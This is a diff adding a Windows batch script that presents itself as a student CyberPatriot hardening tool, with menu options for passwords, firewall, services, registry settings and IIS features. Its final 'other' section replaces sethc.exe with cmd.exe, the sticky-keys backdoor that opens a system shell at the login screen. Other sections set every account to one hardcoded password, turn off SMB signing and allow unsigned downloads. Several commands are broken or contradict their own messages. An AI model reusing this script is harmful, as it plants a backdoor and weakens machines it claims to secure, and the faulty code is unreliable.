@@ -1,0 +1,444 @@
+@echo off
+setlocal EnableDelayedExpansion
+net session
+
+for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%`b in (1) do rem"') do (
+  set "DEL=%%a"
+)
+
+rem Prepare a file "X" with only one dot
+<nul > X set /p ".=."
+
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+call :color 0b "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 4e "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 19 "Make sure FORENSICS QUESTIONS are done"
+echo.
+echo.
+echo.
+echo.
+call :color 0a "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 4e "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 0C "Make sure FORENSICS QUESTIONS are done"
+echo.
+echo.
+echo.
+echo.
+call :color 2F "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 4e "Make sure FORENSICS QUESTIONS are done"
+echo.
+call :color 0C "Make sure FORENSICS QUESTIONS are done"
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+
+TIMEOUT /T 10
+
+goto :menu
+
+:color
+set "param=^%~2" !
+set "param=!param:"=\"!"
+findstr /p /A:%1 "." "!param!\..\X" nul
+<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"
+exit /b
+
+:menu
+	cls
+	echo 
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	call :color 0b "	            Windows 10 CyberPatriot script, created by		"	 
+	echo.
+	echo "		___________                       ________		   "
+	echo "		\__    ___/___ _____    _____    /  _____/		   "
+	echo "		  |    |_/ __ \\__  \  /     \  /   __  \ 		   "
+	echo "		  |    |\  ___/ / __ \|  Y Y  \ \  |__\  \		   "
+	echo "		  |____| \___  >____  /__|_|  /  \_____  /		   "
+	echo "		             \/     \/      \/         \/ 		   "
+	echo "		    DAVID | IAN | OWEN | EDWARD		   "
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	echo "1) Set user properties			2) Change all passwords		   "
+	echo "3) Disable guests/admins		4) Change password policy	   "
+	echo "5) Set lockout policies		6) Enable Firewall		   "
+	echo "7) Bad files (TESTING)			8) Disable services		   "
+	echo "9) Remote desktop configurations	10) Enable auto updates		   "
+	echo "11) Security options			12) Audit machine		   "
+	echo "13) Group editing	(reg)		14)Security options		   "
+	echo "15) IPFlush+HostsFile			16)SavedCredentials		   "
+	echo "17) Remote Access			18) Windows Features		   "
+	echo "19) Power Settings				20) Other		   "
+	echo "E) Exit				R) Reboot			   "
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	set /p answer=Please choose an option for execution: 
+		if "%answer%"=="1" goto :userProp
+		if "%answer%"=="2" goto :passwd
+		if "%answer%"=="3" goto :disGueAdm
+		if "%answer%"=="4" goto :passwdPol
+		if "%answer%"=="5" goto :lockout
+		if "%answer%"=="6" goto :firewall
+		if "%answer%"=="7" goto :badFiles
+		if "%answer%"=="8" goto :services
+		if "%answer%"=="9" goto :remDesk
+		if "%answer%"=="10" goto :autoUpdate
+		if "%answer%"=="11" goto :secureoperations
+		if "%answer%"=="12" goto :audit
+		if "%answer%"=="13" goto :group
+		if "%answer%"=="14" goto :dnsflush
+		if "%answer%"=="15" goto :ipConfighostsFile
+		if "%answer%"=="16" goto :savedcredentials
+		if "%answer%"=="17" goto :remoteaccess
+		if "%answer%"=="18" goto :winfeatures
+		if "%answer%"=="19" goto :powersettings
+		if "%answer%"=="20" goto :other
+		if "%answer%"=="E" exit
+		if "%answer%"=="R" shutdown /rs
+	pause
+
+:userProp
+	echo Setting password never expires
+	wmic UserAccount set PasswordExpires=True
+	wmic UserAccount set PasswordChangeable=True
+	wmic UserAccount set PasswordRequired=True
+	goto :menu
+
+:passwd
+	endlocal
+	setlocal EnableExtensions
+	for /F "tokens=2* delims==" %%G in ('
+		wmic UserAccount where "status='ok'" get name >null
+	') do for %%g in (%%~G) do (
+		net user %%~g Cyberpatriot1!
+		)
+	endlocal
+	setlocal enabledelayedexpansion	
+	pause
+	goto :menu
+	
+:disGueAdm
+	net user Guest | findstr Active | findstr Yes
+	if %errorlevel%==0 (
+		echo Guest account is already disabled.
+	)
+	if %errorlevel%==1 (
+		net user guest Cyberpatriot1! /active:no
+	)
+	
+	rem Disables the Admin account
+	net user Administrator | findstr Active | findstr Yes
+	if %errorlevel%==0 (
+		echo Admin account is already disabled.
+
+		goto :menu
+	)
+	if %errorlevel%==1 (
+		net user administrator Cyberpatriot1! /active:no
+
+		goto :menu
+	)
+	
+:passwdPol
+	rem Sets the password policy
+	rem Set complexity requirments
+	echo Setting pasword policies
+	net accounts /minpwlen:10
+	net accounts /maxpwage:30
+	net accounts /minpwage:5
+	net accounts /uniquepw:3
+	goto :menu
+	
+:lockout
+	rem Sets the lockout policy
+	echo Setting the lockout policy
+	net accounts /lockoutduration:20
+	net accounts /lockoutthreshold:5
+	net accounts /lockoutwindow:20
+	goto :menu
+	
+:firewall
+	rem Enables firewall
+	netsh advfirewall set allprofiles state on
+	netsh advfirewall reset
+	netsh advfirewall firewall set rule name="Remote Assistance (DCOM-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Remote Assistance (PNRP-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Remote Assistance (RA Server TCP-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Remote Assistance (SSDP TCP-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Remote Assistance (SSDP UDP-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Remote Assistance (TCP-In)" new enable=no >NUL
+	netsh advfirewall firewall set rule name="Telnet Server" new enable=no >NUL
+	netsh advfirewall firewall set rule name="netcat" new enable=no >NUL
+	goto :menu
+	
+:badFiles
+	goto :menu
+
+:services
+	echo Disabling Services
+	sc stop TapiSrv
+	sc config TapiSrv start= disabled
+	sc stop TlntSvr
+	sc config TlntSvr start= disabled
+	sc stop ftpsvc
+	sc config ftpsvc start= disabled
+	sc stop SNMP
+	sc config SNMP start= disabled
+	sc stop SessionEnv
+	sc config SessionEnv start= disabled
+	sc stop TermService
+	sc config TermService start= disabled
+	sc stop UmRdpService
+	sc config UmRdpService start= disabled
+	sc stop SharedAccess
+	sc config SharedAccess start= disabled
+	sc stop remoteRegistry 
+	sc config remoteRegistry start= disabled
+	sc stop SSDPSRV
+	sc config SSDPSRV start= disabled
+	sc stop W3SVC
+	sc config W3SVC start= disabled
+	sc stop SNMPTRAP
+	sc config SNMPTRAP start= disabled
+	sc stop remoteAccess
+	sc config remoteAccess start= disabled
+	sc stop RpcSs
+	sc config RpcSs start= disabled
+	sc stop HomeGroupProvider
+	sc config HomeGroupProvider start= disabled
+	sc stop HomeGroupListener
+	sc config HomeGroupListener start= disabled
+	goto :menu
+
+:remDesk
+	rem Ask for remote desktop
+	set /p answer=Remove remote desktop? [Y / N]
+	if /I "%answer%"=="N" (
+		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+		echo RemoteDesktop has been disabled, reboot for this to take full effect.
+	)
+	if /I "%answer%"=="Y" (
+		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+		echo RemoteDesktop has been enabled, reboot for this to take full effect.
+	)
+	goto :menu
+	
+:autoUpdate
+	echo AutoUpdate executing...
+	reg add "HKLM\SOFTWARE\Microsoft\WINDOWS\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 4 /f
+	echo AutoUpdate executed!
+	goto :menu
+	
+:secureoperations
+	echo Changing security options now.
+
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnonZoneCrossing /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg\AllowedPaths /v Machine /t REG_MULTI_SZ /d "" /f
+reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System /v EnableSmartScreen /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg\AllowedExactPaths /v Machine /t REG_MULTI_SZ /d "" /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableInstallerDetection /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v fullprivilegeauditing /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v dontdisplaylastusername /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters /v EnablePlainTextPassword /t REG_DWORD /d 0 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllocateCDRoms /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 0 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v RequireStrongKey /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v NullSessionPipes /t REG_MULTI_SZ /d "" /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v everyoneincludesanonymous /t REG_DWORD /d 0 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autodisconnect /t REG_DWORD /d 45 /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "Welcome!"
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v restrictanonymous /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v restrictanonymoussam /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v SignSecureChannel /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v requiresecuritysignature /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v disabledomaincreds /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v auditbaseobjects /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v NullSessionShares /t REG_MULTI_SZ /d "" /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Print\Providers\LanMan Print Services\Servers" /v AddPrinterDrivers /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllocateFloppies /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnonBadCertRecving /t REG_DWORD /d /1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v DisablePasswordCaching /t REG_DWORD /d 1 /f
+reg ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetTcpPortSharing /v Start /t REG_DWORD /d 4 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v enablesecuritysignature /t REG_DWORD /d 0 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v UseMachineId /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Internet Explorer\Download" /v RunInvalidSignatures /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV8 /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 0 /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v MaximumPasswordAge /t REG_DWORD /d 15 /f
+reg ADD HKCU\SYSTEM\CurrentControlSet\Services\CDROM /v AutoRun /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Welcome!"
+reg ADD "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_LOCALMACHINE_LOCKDOWN\Settings" /v LOCALMACHINE_CD_UNLOCK /t REG_DWORD /d 1 /t
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnOnPostRedirect /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v SealSecureChannel /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v DisablePasswordChange /t REG_DWORD /d 1 /f
+reg ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 1 /f
+reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLua /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Internet Explorer\Main" /v DoNotTrack /t REG_DWORD /d 1 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v RequireSignOrSeal /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v undockwithoutlogon /t REG_DWORD /d 0 /f	
+bcdedit.exe /set {current} nx AlwaysOn
+	goto :menu
+	
+:audit
+	echo Auditing machine...
+	auditpol /set /category:* /success:enable
+	auditpol /set /category:* /failure:enable
+	echo Auditing enabled!
+	goto :menu
+
+:group
+	cls
+	net localgroup
+	set /p grp=What group would you like to check?:
+	net localgroup !grp!
+	set /p answer=Is there a user you would like to add or remove?[add/remove/back]:
+	if "%answer%"=="add" (
+		set /p userAdd=Please enter the user you would like to add: 
+		net localgroup !grp! !userAdd! /add
+		echo !userAdd! has been added to !grp!
+	)
+	if "%answer%"=="remove" (
+		set /p userRem=Please enter the user you would like to remove:
+		net localgroup !grp! !userRem! /delete
+		echo !userRem! has been removed from !grp!
+	)
+	if "%answer%"=="back" (
+		goto :group
+	)
+
+	set /p answer=Would you like to go check again?[y/n]
+	if /I "%answer%"=="y" (
+		goto :group
+	)
+	if /I "%answer%"=="n" (
+		goto :menu
+	)
+endlocal
+
+:dnsflush
+	ipconfig /release
+	ipconfig /fludns
+	ipconfig /renew
+	goto :menu
+
+:ipConfighostsFile
+	ipconfig /flushdns
+	attrib -r -s C:\WINDOWS\system32\drivers\etc\hosts
+	echo > C:\Windows\System32\drivers\etc\hosts
+	net start
+	net start > servicesstarted.txt
+	net start | findstr Remote Registry
+	if %errorlevel%==0 (
+		net stop RemoteRegistry
+		sc config RemoteRegistry start=disabled
+		if %errorlevel%==1 echo Stop failed... sorry...
+	) else ( 
+		echo Remote Registry is stopped
+	)
+	goto :menu
+
+:savedcredentials
+	cmdkey.exe /list > "%TEMP%\List.txt"
+	findstr.exe Target "%TEMP%\List.txt" > "%TEMP%\tokensonly.txt"
+	FOR /F "tokens=1,2 delims= " %%G IN (%TEMP%\tokensonly.txt) DO cmdkey.exe /delete:%%H
+	del "%TEMP%\*.*" /s /f /q
+	goto :menu
+
+:remoteaccess
+	set SRVC_LIST=(RemoteAccess Telephony tlntsvr p2pimsvc simptcp fax msftpsvc)
+		for %%i in %HITHERE% do net stop %%i
+		for %%i in %HITHERE% sc config %%i start= disabled
+	goto :menu
+
+:winfeatures
+	dism /online /disable-feature /featurename:IIS-ISAPIFilter >NUL
+	dism /online /disable-feature /featurename:TFTP >NUL
+	dism /online /disable-feature /featurename:IIS-HttpLogging >NUL
+	dism /online /disable-feature /featurename:IIS-ManagementService >NUL
+	dism /online /disable-feature /featurename:IIS-HealthAndDiagnostics >NUL
+	dism /online /disable-feature /featurename:IIS-HttpErrors >NUL
+	dism /online /disable-feature /featurename:IIS-WebServerRole >NUL
+	dism /online /disable-feature /featurename:IIS-WebServerManagementTools >NUL
+	dism /online /disable-feature /featurename:IIS-NetFxExtensibility45 >NUL
+	dism /online /disable-feature /featurename:IIS-ApplicationDevelopment >NUL
+	dism /online /disable-feature /featurename:IIS-WMICompatibility >NUL
+	dism /online /disable-feature /featurename:IIS-ASP >NUL
+	dism /online /disable-feature /featurename:IIS-ISAPIExtensions >NUL
+	dism /online /disable-feature /featurename:IIS-IIS6ManagementCompatibility >NUL
+	dism /online /disable-feature /featurename:TelnetServer >NUL
+	dism /online /disable-feature /featurename:IIS-LegacySnapIn >NUL
+	dism /online /disable-feature /featurename:TelnetClient >NUL
+	dism /online /disable-feature /featurename:IIS-ServerSideIncludes >NUL
+	dism /online /disable-feature /featurename:IIS-WebSockets >NUL
+	dism /online /disable-feature /featurename:IIS-NetFxExtensibility >NUL
+	dism /online /disable-feature /featurename:IIS-FTPSvc >NUL
+	dism /online /disable-feature /featurename:IIS-Performance >NUL
+	dism /online /disable-feature /featurename:IIS-CustomLogging >NUL
+	dism /online /disable-feature /featurename:IIS-DefaultDocument >NUL
+	dism /online /disable-feature /featurename:IIS-WebDAV >NUL
+	dism /online /disable-feature /featurename:IIS-HttpCompressionStatic >NUL
+	dism /online /disable-feature /featurename:IIS-RequestFiltering >NUL
+	dism /online /disable-feature /featurename:IIS-ASPNET >NUL
+	dism /online /disable-feature /featurename:IIS-FTPServer >NUL
+	dism /online /disable-feature /featurename:IIS-StaticContent >NUL
+	dism /online /disable-feature /featurename:IIS-LoggingLibraries >NUL
+	dism /online /disable-feature /featurename:IIS-URLAuthorization >NUL
+	dism /online /disable-feature /featurename:IIS-HttpRedirect >NUL
+	dism /online /disable-feature /featurename:IIS-HttpTracing >NUL
+	dism /online /disable-feature /featurename:IIS-ManagementConsole >NUL
+	dism /online /disable-feature /featurename:IIS-HttpCompressionDynamic >NUL
+	dism /online /disable-feature /featurename:IIS-FTPExtensibility >NUL
+	dism /online /disable-feature /featurename:IIS-ApplicationInit >NUL
+	dism /online /disable-feature /featurename:IIS-IPSecurity >NUL
+	dism /online /disable-feature /featurename:IIS-CommonHttpFeatures >NUL
+	dism /online /disable-feature /featurename:IIS-WebServer >NUL
+	dism /online /disable-feature /featurename:IIS-CGI >NUL
+	dism /online /disable-feature /featurename:IIS-Security >NUL
+	dism /online /disable-feature /featurename:IIS-HostableWebCore >NUL
+	dism /online /disable-feature /featurename:IIS-RequestMonitor >NUL
+	dism /online /disable-feature /featurename:IIS-ASPNET45 >NUL
+	dism /online /disable-feature /featurename:IIS-DirectoryBrowsing >NUL
+	dism /online /disable-feature /featurename:IIS-BasicAuthentication >NUL
+	dism /online /disable-feature /featurename:IIS-ManagementScriptingTools >NUL
+	dism /online /disable-feature /featurename:IIS-Metabase >NUL
+	dism /online /disable-feature /featurename:IIS-LegacyScripts >NUL
+	goto :menu
+
+:powersettings
+	powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
+	powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
+	powercfg -SETDCVALUEINDEX SCHEME_MIN SUB_NONE CONSOLELOCK 1
+	powercfg -SETDCVALUEINDEX SCHEME_MIN SUB_NONE CONSOLELOCK 1
+	powercfg -SETDCVALUEINDEX SCHEME_MAX SUB_NONE CONSOLELOCK 1
+	powercfg -SETDCVALUEINDEX SCHEME_MAX SUB_NONE CONSOLELOCK 1
+	goto :menu
+
+:other
+	takeown /f cmd.exe >NUL
+	takeown /f sethc.exe >NUL
+	icacls cmd.exe /grant %username%:F >NUL
+	icacls sethc.exe /grant %username%:F >NUL
+	move sethc.exe sethc.old.exe
+	copy cmd.exe sethc.exe
+	goto :menu
